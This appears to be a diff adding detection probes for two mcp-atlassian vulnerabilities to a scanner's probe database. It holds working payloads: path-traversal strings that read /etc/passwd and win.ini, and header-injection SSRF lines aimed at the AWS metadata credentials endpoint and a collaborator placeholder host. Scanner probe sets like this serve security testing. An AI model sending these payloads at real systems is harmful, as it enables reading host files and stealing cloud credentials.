@@ -84,6 +84,63 @@
           "variables": {"reference_only": true}
         }
       ]
+    },
+    "mcp_atlassian_path_traversal_rce_2026": {
+      "description": "CVE-2026-27825 (mcp-atlassian) — unauthenticated path traversal in the Confluence attachment-download tool. Missing directory confinement + inadequate path validation: `../../../etc/passwd` or `..\\..\\..\\windows\\system32\\config\\sam` style paths read arbitrary host files; weaponised variants drop a payload into a known temp dir then chain to RCE via Python pickle deserialization in attachment indexing.",
+      "tech_match": ["mcp-atlassian", "atlassian-mcp", "confluence"],
+      "param_match": ["filename", "path", "attachment_id", "file"],
+      "probes": [
+        {
+          "payload": "../../../../../../etc/passwd",
+          "description": "Linux LFI canary via attachment-download path. Expect /etc/passwd content (root:x:0: line) on vulnerable instances.",
+          "matchers": [
+            {"type": "regex", "pattern": "root:x:0:0:|daemon:x:1:1:"},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {"manual_chain": false}
+        },
+        {
+          "payload": "..\\..\\..\\..\\windows\\win.ini",
+          "description": "Windows LFI canary. Expect [fonts] / [extensions] sections.",
+          "matchers": [
+            {"type": "regex", "pattern": "\\[fonts\\]|\\[extensions\\]|for 16-bit app"},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {"manual_chain": false}
+        }
+      ]
+    },
+    "mcp_atlassian_header_ssrf_2026": {
+      "description": "CVE-2026-27826 (mcp-atlassian) — middleware honors `X-Atlassian-Jira-Url` and `X-Atlassian-Confluence-Url` request headers without validation, allowing SSRF to arbitrary destinations from the victim MCP host. Effective for cloud-metadata exfil (IMDS/IMDSv2/Azure/GCP) and internal-service pivoting from the MCP server's network position.",
+      "tech_match": ["mcp-atlassian", "atlassian-mcp"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "X-Atlassian-Jira-Url: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "description": "Header-based SSRF to AWS IMDS. Expect AccessKeyId/SecretAccessKey in response body. Inject via custom_headers.",
+          "matchers": [
+            {"type": "word", "words": ["AccessKeyId", "SecretAccessKey", "ami-id"], "condition": "or"},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {"manual_chain": false, "header_injection": "X-Atlassian-Jira-Url"}
+        },
+        {
+          "payload": "X-Atlassian-Confluence-Url: http://COLLABORATOR/",
+          "description": "Header-SSRF Collaborator canary — blind confirmation when victim MCP host has no metadata service reachable.",
+          "matchers": [
+            {"type": "collaborator", "interaction_types": ["HTTP", "DNS"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {"manual_chain": false, "requires_collaborator": true, "header_injection": "X-Atlassian-Confluence-Url"}
+        }
+      ]
     }
   }
 }
